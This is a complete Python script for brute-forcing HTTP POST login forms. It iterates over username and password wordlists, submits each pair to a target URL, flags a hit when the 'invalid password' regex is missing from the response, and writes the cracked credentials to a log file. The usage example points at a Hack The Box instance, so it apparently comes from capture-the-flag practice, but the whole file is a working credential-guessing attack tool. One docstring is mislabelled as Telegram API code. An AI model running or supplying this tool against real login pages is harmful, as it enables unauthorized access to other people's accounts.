#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations

import argparse
import json
import logging
import re
import sys
from http import HTTPStatus
from pathlib import Path
from typing import Dict, List

import requests

from logger import get_logger

REQ_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
}


def check_regex_response(response: str, regex: str) -> bool:
    """
    Metodo para comprobar si la respuesta contiene el texto esperado, que sera el que conocemos (el de contraseña
    invalida)
    :param response:
    :param regex:
    :return:
    """
    # print(len(response))
    # if len(response) != 673:
    if not re.search(regex, response, re.IGNORECASE):
        logger.warning("EXITO")
        return True
    return False


def make_request(request_url: str, method: str = 'post', form: Dict = None) -> requests.models.Response:
    """
    Makes a request to the Telegram API.
    :param request_url: Name of the API method to be called. (E.g. 'getUpdates')
    :param method: HTTP method to be used. Defaults to 'get'.
    :param form: Optional parameters. Should be a dictionary with key-value pairs.
    :param files: Optional files.
    :return: The result parsed to a JSON dictionary.
    """
    try:
        # response = requests.post(request_url, data=form, headers=REQ_HEADERS)
        response: requests.models.Response = requests.request(method, request_url, headers=REQ_HEADERS, data=form)
    except requests.exceptions.ConnectionError as e:
        logger.critical(f'Error in target: {e}')
        sys.exit(1)
    return response


def request_sync(args: argparse, username: str, password: str, my_json: Dict, total_size: int, cont):
    response: requests.models.Response = make_request(args.target, form=my_json)
    if response.status_code == HTTPStatus.OK:
        valid: bool = check_regex_response(response.text, args.regex)
        if valid:
            logger.warning(f'Trying {cont}/{total_size}: user: "{username}", pass: "{password}" -> Success')
            p: Path = Path('bruteforce_post.log')
            with open(str(p), 'a') as f:
                f.write(f'Trying: user: "{username}", pass: "{password}" -> Success\n')
            sys.exit(0)
        else:
            logger.debug(f'Trying {cont}/{total_size}: user: "{username}", pass: "{password}" -> Fail')
    else:
        logger.error(response)
        logger.error(response.text)


def is_online(url):
    """
    Metodo para comprobar si hay conexion hacia el target
    :param url:
    :return:
    """
    try:
        requests.models.Response = requests.get(url)
    except requests.exceptions.ConnectionError as e:
        logger.critical(f'Error in target: {e}')
        sys.exit(1)


def main(args: argparse):
    """
    Metodo que realizada una peticion sincrona post por cada elemento de los diccionarios proporcionados
    :param args:
    :return:
    """
    name_username: str
    name_password: str
    my_json: Dict[str, str] = json.loads(args.json)
    keys_json = list(my_json)

    # si el json tiene 1 valor se entiende que es la pass, si tiene 2 hay user y pass
    if len(keys_json) >= 2:
        name_username = keys_json[0]
        name_password = keys_json[1]
    elif len(keys_json) == 1:
        name_username = ''
        name_password = keys_json[0]
    else:
        logger.critical('json is not valid')
        sys.exit(1)

    dict_users: List = list()
    dict_passwords: List = list()

    # creamos un diccionaro de users
    if args.Login is None:
        dict_users.append(args.login)
    else:
        file_username: Path = Path(args.Login)
        if file_username.exists():
            dict_users = file_username.read_text().split('\n')
            dict_users.remove('')  # eliminar lineas en blanco
        else:
            logger.critical(f'File "{args.Login}" not exits')
            sys.exit(1)

    # creamos un diccionaro de passwords
    if args.Password is None:
        dict_passwords.append(args.password)
    else:
        file_password: Path = Path(args.Password)
        if file_password.exists():
            dict_passwords = file_password.read_text().split('\n')
        else:
            logger.critical(f'File "{args.Password}" not exits')
            sys.exit(1)

    is_online(args.target)

    len_user = len(dict_users)
    len_pwd = len(dict_passwords)

    user: str
    pwd: str
    cont: int = 1

    for user in dict_users:
        # Actualizamos el username si es necesario ponerlo, ya se hace al crear la lista
        if name_username in my_json.keys():
            my_json[name_username] = user

        for pwd in dict_passwords:
            # Actualizamos la contraseña
            if name_password in my_json.keys():
                my_json[name_password] = pwd

            request_sync(args, user, pwd, my_json, len_user * len_pwd, cont)
            cont += 1


def create_arg_parser() -> argparse:
    """
    Metodo para establecer los argumentos que necesita la clase
    :return:
    """

    example = """python3 %(prog)s  http://docker.hackthebox.eu:31658/ 'Invalid password!' -l admin -P password.txt -j '{"password":""}' -v"""
    my_parser = argparse.ArgumentParser(
        description='%(prog)s is a script to perform brute force attacks by begging HTTP POST requests.',
        usage=f'{example}')

    requiered = my_parser.add_argument_group('requiered arguments')
    requiered.add_argument('target', help='Target to send requests.')
    requiered.add_argument('regex', help='Regular expression we get with incorrect authentication.')

    my_parser.add_argument('-j', '--json', help='Json of the form that is sent with the credentials.',
                           default='{"username":"","password":""}')
    my_parser.add_argument('-l', '--login', help='Name of a user.', default='root')
    my_parser.add_argument('-L', '--Login', help='Path of a file with users.')
    my_parser.add_argument('-p', '--password', help='A passwords.', default='admin')
    my_parser.add_argument('-P', '--Password', help='Path of a file with passwords.')
    # my_parser.add_argument('-a', '--advanced', action='store_true', help='Scan advanced (boolean).', default=False)
    my_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose flag (boolean).', default=False)

    if len(sys.argv) == 1:
        my_parser.print_help()
        sys.exit(1)
    return my_parser.parse_args()


if __name__ == '__main__':
    arg: argparse = create_arg_parser()

    global logger
    logger = get_logger(arg.verbose, 'bruteforce')

    if arg.verbose:
        logger.setLevel(logging.DEBUG)
    else:
        logger.setLevel(logging.INFO)

    main(arg)
